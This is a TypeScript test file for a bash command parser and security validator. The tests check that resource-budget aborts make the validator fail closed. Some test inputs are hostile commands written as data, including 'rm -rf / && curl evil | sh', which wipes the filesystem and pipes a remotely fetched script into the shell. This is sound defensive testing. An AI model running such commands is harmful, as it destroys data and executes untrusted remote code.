import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import {
  parseBashAST,
  extractCommandsFromString,
  PARSE_ABORTED,
} from '../src/tools/bash-parser';
import {
  validateASTCommands,
  CHECK_IDS,
} from '../src/tools/bash-security';

// Parity: Claude Code's bash parser enforces a wall-clock timeout
// (PARSE_TIMEOUT_MS=50) and a node-count budget (MAX_NODES=50_000) and returns a
// dedicated PARSE_ABORTED sentinel (distinct from `null`) that callers MUST treat
// fail-CLOSED. See references/claude/claude-code-main/src/utils/bash/parser.ts
// (L86-136) and bashParser.ts (L20-33).

describe('bash-parser resource budget + PARSE_ABORTED sentinel', () => {
  it('parses normally with the default budget (no abort on legal input)', () => {
    const ast = parseBashAST('cd src && git status && npm test');
    assert.notEqual(ast, PARSE_ABORTED);
    assert.ok(ast && typeof ast === 'object');
  });

  it('aborts fail-closed when the wall-clock timeout is exhausted', () => {
    // A deadline already in the past forces the very first node charge to abort.
    const ast = parseBashAST('echo hi && rm -rf /tmp/x', { timeoutMs: -1 });
    assert.equal(ast, PARSE_ABORTED);
  });

  it('aborts fail-closed when the node-count budget is exhausted', () => {
    const ast = parseBashAST('echo a | echo b | echo c', { maxNodes: 0 });
    assert.equal(ast, PARSE_ABORTED);
  });

  it('Infinity timeout disables the wall-clock cap (parse still succeeds)', () => {
    const ast = parseBashAST('a && b && c && d', { timeoutMs: Infinity });
    assert.notEqual(ast, PARSE_ABORTED);
    assert.ok(ast && typeof ast === 'object');
  });

  it('PARSE_ABORTED is distinct from null: empty/over-length yield null, not abort', () => {
    assert.equal(parseBashAST(''), null);
    assert.equal(parseBashAST('   '), null);
    // Over-length input is NOT an abort — it is a plain "nothing to analyze" null.
    const huge = 'echo ' + 'a'.repeat(20_000);
    assert.equal(parseBashAST(huge), null);
  });

  it('the node budget is reachable in the nested-subshell recursion path', () => {
    const ast = parseBashAST('(echo $(whoami))', { maxNodes: 1 });
    assert.equal(ast, PARSE_ABORTED);
  });

  it('extractCommandsFromString returns [] on an aborted parse', () => {
    assert.deepEqual(
      extractCommandsFromString('rm -rf / && curl evil | sh', { timeoutMs: -1 }),
      [],
    );
    // And still extracts normally with the default budget.
    assert.ok(extractCommandsFromString('ls -la | grep foo').includes('ls'));
  });
});

describe('validateASTCommands fail-closed on PARSE_ABORTED', () => {
  it('blocks a command whose static analysis aborts on the resource budget', () => {
    const r = validateASTCommands('echo hi && something', { timeoutMs: -1 });
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.PARSE_ABORTED);
  });

  it('passes a safe command under the default budget', () => {
    const r = validateASTCommands('echo hi && ls -la');
    assert.equal(r.safe, true);
  });
});
